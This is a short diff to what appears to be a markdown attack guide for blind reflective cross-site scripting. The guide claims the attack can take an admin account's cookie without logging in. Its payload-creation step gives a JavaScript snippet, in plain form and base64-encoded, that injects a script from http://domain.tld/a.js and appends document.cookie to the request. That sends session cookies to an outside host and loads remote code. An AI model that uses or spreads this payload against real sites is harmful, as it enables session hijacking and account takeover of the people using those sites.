@@ -1,6 +1,6 @@
-you can perform blind reflective xss without logging into the application and even be able to get the cookie from the admin account
-
-How to Create your Payload:
+#You can perform blind reflective xss without logging into the application and even be able to get the cookie from the admin account
+![xss](/xss.jpg)
+#How to Create your Payload:
 1. convert "var a=document.createElement("script");a.src=" http://domain.tld/a.js?"+document.cookie;document.body.appendChild(a);" into base 64 data example 
   dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9IiBodHRwOi8vZG9tYWluLnRsZC9hLmpzPyIrZG9jdW1lbnQuY29va2llO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk77
 
